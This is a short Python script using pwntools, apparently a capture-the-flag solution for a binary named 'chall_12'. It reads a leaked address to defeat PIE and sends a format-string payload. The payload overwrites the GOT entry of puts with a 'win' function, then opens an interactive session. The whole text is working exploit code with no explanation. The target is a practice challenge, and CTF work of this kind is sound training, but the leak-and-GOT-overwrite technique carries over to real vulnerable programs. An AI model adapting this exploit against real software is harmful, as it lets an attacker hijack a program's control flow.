from pwn import *
elf=ELF("./chall_12")
r=process('./chall_12')
r.recvuntil(b':')
leak = r.recv()
intleak = int(leak,16)
elf.address = intleak - elf.sym['main']
#construct a payload using format string
payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win},write_size='byte')
r.sendline(payload)
r.interactive()
r.close()
